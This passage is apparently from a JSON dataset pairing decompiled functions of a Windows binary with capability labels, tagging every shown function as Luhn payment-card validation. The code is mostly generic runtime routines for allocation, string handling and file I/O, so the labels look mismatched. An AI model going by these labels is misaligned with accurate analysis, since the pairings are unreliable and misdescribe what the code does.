        "decompiled_code": "\nvoid fcn.140001f14(int64_t *arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    uchar *puVar3;\n    \n    piVar2 = arg2 + 2;\n    puVar3 = arg1 + *arg1 + 0x10;\n    for (iVar1 = *arg2 + 1; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *piVar2;\n        piVar2 = piVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *arg1 = *arg1 + *arg2;\n    return;\n}\n",
        "token_count": 159
    },
    "140001f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140001f42(ulong arg1, int64_t s)\n\n{\n    ulong uVar1;\n    \n    uVar1 = 0;\n    if (s != 0) {\n        uVar1 = sub.msvcrt.dll_strlen(s, s, 0);\n    }\n    sub.msvcrt.dll_fwrite(s, 1, uVar1, arg1);\n    // WARNING: Could not recover jumptable at 0x000140019b38. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.msvcrt.dll_fflush)(arg1);\n    return;\n}\n",
        "token_count": 138
    },
    "14000204": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000204e(ulong dwSize)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4);\n    if (iVar1 == 0) {\n        fcn.140001f83();\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "14000208": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.140002085(ulong arg1)\n\n{\n    uint64_t *arg1_00;\n    uint64_t auStack72 [8];\n    \n    arg1_00 = auStack72;\n    auStack72[0] = arg1;\n    fcn.140002078(arg1_00, 0x40);\n    auStack72[0] = auStack72[0] & 0xffffffff;\n    fcn.14000180b(arg1_00);\n    fcn.140001a2e(arg1_00);\n    fcn.14000180b(arg1_00);\n    return auStack72[0] & 0xffffffff;\n}\n",
        "token_count": 148
    },
    "14000230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000230d(uchar *arg1, int64_t arg2)\n\n{\n    uchar *puStack16;\n    \n    if (arg1 != NULL) {\n        fcn.140002078(arg1, arg2);\n        puStack16 = arg1;\n        do {\n            *puStack16 = 0;\n            puStack16 = puStack16 + 1;\n            arg2 = arg2 + -1;\n        } while (arg2 != 0);\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "14000234": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140002344(int64_t arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    ulong *puVar2;\n    int64_t arg1_00;\n    \n    piVar1 = *(arg1 + 0x2078);\n    if ((piVar1 == NULL) || (*piVar1 < arg2)) {\n        puVar2 = fcn.14000204e(0x1000);\n        *(arg1 + 0x2080) = *(arg1 + 0x2080) + 0x1000;\n        *(arg1 + 0x2078) = puVar2;\n        *puVar2 = 0xfe8;\n        puVar2[1] = 0x18;\n        puVar2[2] = piVar1;\n    }\n    piVar1 = *(arg1 + 0x2078);\n    *piVar1 = *piVar1 - arg2;\n    arg1_00 = piVar1 + piVar1[1];\n    piVar1[1] = piVar1[1] + arg2;\n    fcn.140002078(arg1_00, arg2);\n    return arg1_00;\n}\n",
        "token_count": 270
    },
    "14000263": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000263c(ulong arg1, int64_t arg2)\n\n{\n    ulong *puVar1;\n    uint32_t uVar2;\n    uint64_t arg1_00;\n    \n    arg1_00 = arg2 >> 9;\n    puVar1 = fcn.140001e7d(arg1_00);\n    if (puVar1 == NULL) {\n        puVar1 = fcn.140002344(arg1, 0x50);\n        *puVar1 = *((arg1_00 & 0xff) * 8 + 0x1400ed3f0);\n        *((arg1_00 & 0xff) * 8 + 0x1400ed3f0) = puVar1;\n        puVar1[1] = arg1_00;\n    }\n    uVar2 = arg2 & 0x1ff;\n    puVar1[(uVar2 >> 6) + 2] = puVar1[(uVar2 >> 6) + 2] | 1 << (uVar2 & 0x3f);\n    return;\n}\n",
        "token_count": 245
    },
    "14000272": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.14000272a(uint *arg1, uint64_t arg2)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    fcn.140002078(&uStack24, 0x10);\n    iVar1 = fcn.14000158a(arg2 & 0xffffffff);\n    iVar2 = (arg2 >> (iVar1 - 5U & 0x3f)) + -0x20;\n    uStack24 = iVar1 + -6;\n    uStack20 = iVar1 + -6 >> 0x20;\n    uStack16 = iVar2;\n    uStack12 = iVar2 >> 0x20;\n    *arg1 = uStack24;\n    arg1[1] = uStack20;\n    arg1[2] = uStack16;\n    arg1[3] = uStack12;\n    return arg1;\n}\n",
        "token_count": 220
    },
    "1400027f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400027fd(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    uint32_t *puVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iStack24;\n    int64_t iStack16;\n    \n    iStack16 = arg1;\n    iVar3 = fcn.1400026af(arg1, arg2, arg3);\n    iVar4 = iStack16;\n    fcn.14000272a(&iStack24, *(iVar3 + 8));\n    *(iVar3 + 0x18) = 0;\n    iVar2 = *(iVar4 + 8 + (iStack24 * 0x20 + 0x10e + iStack16) * 8);\n    *(iVar3 + 0x10) = iVar2;\n    if (iVar2 != 0) {\n        *(iVar2 + 0x18) = iVar3;\n    }\n    *(iVar4 + 8 + (iStack24 * 0x20 + 0x10e + iStack16) * 8) = iVar3;\n    puVar1 = iVar4 + 0x814 + iStack24 * 4;\n    *puVar1 = *puVar1 | 1 << (iStack16 & 0x1f);\n    *(iVar4 + 0x810) = *(iVar4 + 0x810) | 1 << (iStack24 & 0x1f);\n    return;\n}\n",
        "token_count": 336
    },
    "140002d3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140002d30(int64_t arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.1400029cb(0x1400eb348, arg1 + 0x10);\n    *(iVar1 + 8) = 1;\n    iVar1 = iVar1 + 0x10;\n    fcn.140002078(iVar1, arg1);\n    return iVar1;\n}\n",
        "token_count": 97
    },
    "140002d6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140002d6a(ulong arg1)\n\n{\n    ulong uVar1;\n    \n    uVar1 = fcn.140001541(arg1);\n    // WARNING: Could not recover jumptable at 0x000140002d7a. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LoadLibraryA)(uVar1);\n    return;\n}\n",
        "token_count": 94
    },
    "140004ba": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140004bae(ulong arg1, ulong noname_1, ulong arg3, ulong arg4)\n\n{\n    ulong uStackX24;\n    ulong uStackX32;\n    \n    uStackX24 = arg3;\n    uStackX32 = arg4;\n    fcn.140014c50(arg1, 0x14001c0fd, &uStackX24);\n    return;\n}\n",
        "token_count": 92
    },
    "140004bd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140004bd7(ulong noname_0, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong arg1;\n    ulong uStackX16;\n    ulong uStackX24;\n    ulong uStackX32;\n    \n    uStackX16 = arg2;\n    uStackX24 = arg3;\n    uStackX32 = arg4;\n    arg1 = (**0x14001b130)(1);\n    fcn.140014c50(arg1, \"virtualFree failing!\", &uStackX16);\n    return;\n}\n",
        "token_count": 123
    },
    "140004ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140004ec2(int64_t *arg1, int64_t arg2)\n\n{\n    if (arg2 != 0) {\n        *(arg2 + -0x10) = *(arg2 + -0x10) + 8;\n    }\n    if (*arg1 != 0) {\n        fcn.140004ea2(*arg1 + -0x10);\n    }\n    *arg1 = arg2;\n    return;\n}\n",
        "token_count": 100
    },
    "140004ef": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140004ef3(uint64_t *arg1, uint64_t arg2)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.1400017cb(arg1);\n    if (cVar1 == '\\0') {\n        if (arg2 != 0) {\n            *(arg2 - 0x10) = *(arg2 - 0x10) + 8;\n        }\n        if (0xfff < *arg1) {\n            fcn.140004ea2(*arg1 - 0x10);\n        }\n    }\n    *arg1 = arg2;\n    return;\n}\n",
        "token_count": 136
    },
    "14000500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140005005(void)\n\n{\n    ulong *puVar1;\n    int32_t iVar2;\n    ulong *puVar3;\n    ulong var_120h;\n    ulong var_20h;\n    \n    iVar2 = sub.msvcrt.dll__setjmp(&var_120h, &stack0xfffffffffffffff8);\n    puVar1 = *0x1400eb2e0;\n    if (iVar2 == 0) {\n        for (puVar3 = &var_120h; puVar3 < &var_20h; puVar3 = puVar3 + 1) {\n            fcn.140004f31(*puVar3);\n            fcn.140004f31(*(puVar3 + 4));\n        }\n        for (; puVar3 < puVar1 + -8; puVar3 = puVar3 + 8) {\n            fcn.140004f31(*puVar3);\n            fcn.140004f31(puVar3[1]);\n            fcn.140004f31(puVar3[2]);\n            fcn.140004f31(puVar3[3]);\n            fcn.140004f31(puVar3[4]);\n            fcn.140004f31(puVar3[5]);\n            fcn.140004f31(puVar3[6]);\n            fcn.140004f31(puVar3[7]);\n        }\n        for (; puVar3 <= puVar1; puVar3 = puVar3 + 1) {\n            fcn.140004f31(*puVar3);\n        }\n    }\n    return;\n}\n",
        "token_count": 353
    },
    "14000522": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000522b(ulong arg1)\n\n{\n    uint64_t arg1_00;\n    int64_t iVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    \n    fcn.1400050cf(arg1);\n    fcn.1400054f4(arg1);\n    iVar5 = *0x1400eb338;\ncode_r0x000140005257:\n    if (*0x1400eb328 < 1) {\n        return;\n    }\n    *0x1400eb328 = *0x1400eb328 + -1;\n    arg1_00 = *(iVar5 + *0x1400eb328 * 8);\n    iVar1 = fcn.140001e0c(arg1_00 >> 0xc);\n    if (iVar1 != 0) goto code_r0x00014000528c;\n    fcn.1400050cf(arg1_00);\n    goto code_r0x0001400052b4;\ncode_r0x00014000528c:\n    uVar2 = arg1_00 >> 4 & 0xff;\n    uVar4 = 1 << (uVar2 & 0x3f);\n    iVar3 = (uVar2 >> 6) + 2;\n    uVar2 = *(iVar1 + iVar3 * 8);\n    if ((uVar2 & uVar4) == 0) {\n        *(iVar1 + iVar3 * 8) = uVar2 | uVar4;\ncode_r0x0001400052b4:\n        fcn.1400054f4(arg1_00);\n        iVar5 = *0x1400eb338;\n    }\n    goto code_r0x000140005257;\n}\n",
        "token_count": 397
    },
    "140005d7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.140005d7d(int64_t arg1)\n\n{\n    ulong *puVar1;\n    ulong *arg1_00;\n    \n    fcn.140005984();\n    puVar1 = fcn.1400029cb(0x1400eb348, arg1 + 0x10);\n    puVar1[1] = 0x14001b020;\n    arg1_00 = puVar1 + 2;\n    *puVar1 = 8;\n    fcn.140002078(arg1_00, arg1);\n    return arg1_00;\n}\n",
        "token_count": 131
    },
    "140005f7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t * fcn.140005f79(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    \n    piVar2 = arg1;\n    if (arg1 != NULL) {\n        iVar1 = sub.msvcrt.dll_strlen();\n        piVar2 = fcn.140005f46(iVar1);\n        *piVar2 = iVar1;\n        piVar3 = piVar2 + 2;\n        for (iVar1 = iVar1 + 1; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *piVar3 = *arg1;\n            arg1 = arg1 + 1;\n            piVar3 = piVar3 + 1;\n        }\n    }\n    return piVar2;\n}\n",
        "token_count": 182
    },
    "140005fb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t * fcn.140005fbd(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    \n    if (arg1 != NULL) {\n        arg2 = *arg1 + arg2;\n        piVar2 = arg1;\n        if ((arg1[1] & 0x3fffffffffffffffU) < arg2) {\n            iVar1 = fcn.1400017aa(arg1[1] & 0x3fffffffffffffffU);\n            if (arg2 < iVar1) {\n                arg2 = iVar1;\n            }\n            piVar2 = fcn.140005f46(arg2);\n            iVar1 = *arg1;\n            *piVar2 = iVar1;\n            piVar3 = arg1 + 2;\n            piVar4 = piVar2 + 2;\n            for (iVar1 = iVar1 + 1; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *piVar4 = *piVar3;\n                piVar3 = piVar3 + 1;\n                piVar4 = piVar4 + 1;\n            }\n            piVar2[1] = arg2;\n        }\n        return piVar2;\n    }\n    iVar1 = 7;\n    if (6 < arg2) {\n        iVar1 = arg2;\n    }\n    piVar2 = fcn.140005e2e(0x14001b020, iVar1 + 0x11);\n    piVar2[1] = iVar1;\n    *piVar2 = 0;\n    return piVar2;\n}\n",
        "token_count": 377
    },
    "14000603": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t * fcn.14000603c(int64_t *arg1, ulong arg2)\n\n{\n    int64_t arg1_00;\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    \n    if (arg1 == NULL) {\n        piVar1 = fcn.140005f46(1);\n        *piVar1 = 0;\n    }\n    else {\n        piVar1 = arg1;\n        if ((arg1[1] & 0x3fffffffffffffffU) <= *arg1) {\n            arg1_00 = fcn.1400017aa(arg1[1] & 0x3fffffffffffffffU);\n            piVar1 = fcn.140005f46(arg1_00);\n            iVar2 = *arg1;\n            *piVar1 = iVar2;\n            piVar3 = arg1 + 2;\n            piVar4 = piVar1 + 2;\n            for (iVar2 = iVar2 + 1; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *piVar4 = *piVar3;\n                piVar3 = piVar3 + 1;\n                piVar4 = piVar4 + 1;\n            }\n            piVar1[1] = arg1_00;\n        }\n    }\n    iVar2 = *piVar1;\n    *(piVar1 + iVar2 + 0x10) = arg2;\n    *(piVar1 + iVar2 + 0x11) = 0;\n    *piVar1 = iVar2 + 1;\n    return piVar1;\n}\n",
        "token_count": 367
    },
    "1400060c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400060ce(ulong *arg1, char *arg2)\n\n{\n    char cVar1;\n    ulong arg2_00;\n    \n    while( true ) {\n        cVar1 = *arg2;\n        arg2 = arg2 + 1;\n        if (cVar1 == '\\0') break;\n        arg2_00 = fcn.14000603c(*arg1, cVar1);\n        fcn.140004ef3(arg1, arg2_00);\n    }\n    return;\n}\n",
        "token_count": 115
    },
    "14000614": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140006146(ulong arg1, ulong arg2)\n\n{\n    ulong arg1_00;\n    \n    arg1_00 = fcn.140005e2e(arg1, arg2);\n    fcn.140002078(arg1_00, arg2);\n    return arg1_00;\n}\n",
        "token_count": 69
    },
    "14000631": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.140006315(int64_t *arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    \n    iVar1 = fcn.140001541(arg2);\n    if (iVar1 != 0) {\n        uVar2 = sub.msvcrt.dll_strlen(iVar1);\n        iVar1 = fcn.140006170(iVar1, uVar2);\n    }\n    uVar2 = fcn.140006170(0x14001c14c, 3);\n    iVar1 = (*_sym.imp.msvcrt.dll__wfopen)(iVar1, uVar2);\n    if (iVar1 != 0) {\n        *arg1 = iVar1;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 167
    },
    "14000656": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140006561(ulong arg1)\n\n{\n    ulong auStack16 [2];\n    \n    auStack16[0] = 0;\n    fcn.14000645e(auStack16, arg1);\n    return auStack16[0];\n}\n",
        "token_count": 59
    },
    "14000660": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t * fcn.140006603(uint64_t *arg1)\n\n{\n    int64_t arg1_00;\n    int32_t iVar1;\n    int64_t *piVar2;\n    int64_t *arg1_01;\n    \n    arg1_01 = fcn.140001541(arg1);\n    if (arg1_01 != NULL) {\n        iVar1 = (**0x1400dd580)(0xfde9, 0, arg1_01, *arg1 & 0xffffffff, 0, 0);\n        arg1_00 = (iVar1 + 1) * 2;\n        arg1_01 = fcn.14000637b(arg1_00);\n        *arg1_01 = arg1_00;\n        fcn.140001541(arg1_01);\n        (**0x1400dd580)(0xfde9);\n    }\n    piVar2 = 0x14001c000;\n    if ((arg1_01 != NULL) && (*arg1_01 != 0)) {\n        piVar2 = arg1_01 + 2;\n    }\n    return piVar2;\n}\n",
        "token_count": 251
    },
    "14000672": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000140006750)\n\nvoid fcn.140006729(ulong arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x000140006749. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.USER32.dll_MessageBoxA)(0, arg1, 0, 0);\n    return;\n}\n",
        "token_count": 91
    },
    "140006ca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140006ca8(int64_t arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    uint64_t arg2_00;\n    bool bVar3;\n    \n    piVar2 = *(arg1 + 0x18);\n    iVar1 = piVar2[1];\n    arg2_00 = 0x10;\n    if (iVar1 != 0) {\n        arg2_00 = iVar1 + 0xfU & -iVar1;\n    }\n    iVar1 = arg2 * *piVar2;\n    if ((SEXT816(iVar1) != SEXT816(arg2) * SEXT816(*piVar2)) ||\n       (bVar3 = SCARRY8(arg2_00, iVar1),  arg2_00 = arg2_00 + iVar1,  bVar3)) {\n        func_0x000140006c2b();\n    }\n    piVar2 = fcn.140006146(arg1, arg2_00);\n    *piVar2 = arg2;\n    piVar2[1] = arg2;\n    return;\n}\n",
        "token_count": 252
    },
    "140006cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140006cf1(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    ulong *******pppppppuVar4;\n    ulong uVar5;\n    ulong *******pppppppuVar6;\n    ulong *arg1;\n    int64_t **arg1_00;\n    ulong noname_1;\n    ulong in_R9;\n    ulong *unaff_R12;\n    ulong *arg1_01;\n    ulong *puStack360;\n    ulong *******pppppppuStack352;\n    int64_t iStack344;\n    uchar auStack336 [256];\n    \n    pppppppuVar6 = *0x1400eb250;\n    if (*0x1400eb250 == NULL) {\n        fcn.140006a38(*0x1400eb248);\n        pppppppuVar6 = 0x1;\n        sub.msvcrt.dll_exit();\n    }\n    pppppppuVar6 = pppppppuVar6 + 2;\n    arg1_00 = 0x1;\n    (*_sym.imp.msvcrt.dll_longjmp)();\n    puStack360 = NULL;\n    cVar1 = fcn.140006315(&puStack360, pppppppuVar6);\n    if (cVar1 == '\\0') {\n        unaff_R12 = fcn.140006146(0x1400eb2a0, 0x30);\n        arg1 = 0xd;\n        *unaff_R12 = 0x1400eb260;\n        unaff_R12[2] = \"IOError\";\n        if (pppppppuVar6 != NULL) {\n            arg1 = *pppppppuVar6 + 0xd;\n        }\n        goto code_r0x000140006e8e;\n    }\n    pppppppuStack352 = *0x1400eb250;\n    *0x1400eb250 = &pppppppuStack352;\n    iVar2 = sub.msvcrt.dll__setjmp(auStack336, &stack0xffffffffffffffd0);\n    arg1_01 = puStack360;\n    iStack344 = iVar2;\n    if (iStack344 == 0) {\n        pppppppuVar6 = NULL;\n        noname_1 = 0x14001c0fd;\n        uVar5 = fcn.140001541(arg1_00);\n        iVar2 = fcn.140004bae(arg1_01, noname_1, uVar5, in_R9);\n        while( true ) {\n            while( true ) {\n                pppppppuVar4 = pppppppuVar6;\n                if (arg1_00 != NULL) {\n                    pppppppuVar4 = *arg1_00;\n                }\n                unaff_R12 = arg1_01;\n                if (pppppppuVar4 <= iVar2) goto code_r0x000140006e23;\n                if (*(arg1_00 + iVar2 + 0x10) != '\\0') break;\n                iVar3 = sub.msvcrt.dll_fputc(0, arg1_01);\n                if (iVar3 != 0) goto code_r0x000140006e6e;\n                iVar2 = iVar2 + 1;\n            }\n            iVar3 = fcn.140004bae(arg1_01, 0x14001c0fd, arg1_00 + iVar2 + 0x10, in_R9);\n            if (iVar3 < 1) break;\n            iVar2 = iVar2 + iVar3;\n        }\ncode_r0x000140006e6e:\n        arg1 = 0x1400d6620;\n        fcn.140006ba1(0x1400d6620);\ncode_r0x000140006e7a:\n        sub.msvcrt.dll_fclose();\n        unaff_R12 = arg1_01;\n    }\n    else {\ncode_r0x000140006e23:\n        fcn.140001558();\n        arg1 = puStack360;\n        arg1_01 = unaff_R12;\n        if (puStack360 != NULL) goto code_r0x000140006e7a;\n    }\n    if (iStack344 == 0) {\n        return;\n    }\n    fcn.140006cf1();\ncode_r0x000140006e8e:\n    uVar5 = fcn.14000637b(arg1);\n    fcn.140001f14(uVar5, 0x1400d6660);\n    fcn.140001f3a(uVar5, pppppppuVar6);\n    fcn.140004e55(unaff_R12 + 3, uVar5);\n    fcn.140004e55(unaff_R12 + 1, 0);\n    fcn.140006a95(unaff_R12, \"IOError\");\n    return;\n}\n",
        "token_count": 1084
    },
    "14000a84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000a840(void)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x1400edfe0);\n    pcVar3 = _sym.imp.KERNEL32.dll_TlsGetValue;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetLastError;\n    for (puVar1 = *0x1400edfc0; puVar1 != NULL; puVar1 = *(puVar1 + 4)) {\n        iVar5 = (*pcVar3)(*puVar1);\n        iVar4 = (*pcVar2)();\n        if ((iVar4 == 0) && (iVar5 != 0)) {\n            (**(puVar1 + 2))();\n        }\n    }\n    // WARNING: Could not recover jumptable at 0x00014000a8a4. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x1400edfe0);\n    return;\n}\n",
        "token_count": 251
    },
    "14000abd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14000abd0(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int32_t *piVar3;\n    \n    if (((**0x1400d7060 == 0x5a4d) && (piVar3 = *(*0x1400d7060 + 0x1e) + *0x1400d7060,  *piVar3 == 0x4550)) &&\n       (*(piVar3 + 6) == 0x20b)) {\n        iVar2 = piVar3 + *(piVar3 + 5) + 0x18;\n        if (*(piVar3 + 6) != 0) {\n            iVar1 = iVar2 + 0x28;\n            do {\n                if ((*(iVar2 + 0xc) <= arg1 - *0x1400d7060) && (arg1 - *0x1400d7060 < *(iVar2 + 0xc) + *(iVar2 + 8))) {\n                    return iVar2;\n                }\n                iVar2 = iVar2 + 0x28;\n            } while (iVar2 != iVar1 + (*(piVar3 + 6) - 1) * 0x28);\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 292
    },
    "14000ac5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort fcn.14000ac50(void)\n\n{\n    int32_t *piVar1;\n    \n    if (((**0x1400d7060 == 0x5a4d) && (piVar1 = *0x1400d7060 + *(*0x1400d7060 + 0x1e),  *piVar1 == 0x4550)) &&\n       (*(piVar1 + 6) == 0x20b)) {\n        return *(piVar1 + 6);\n    }\n    return 0;\n}\n",
        "token_count": 120
    },
    "14000ad0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
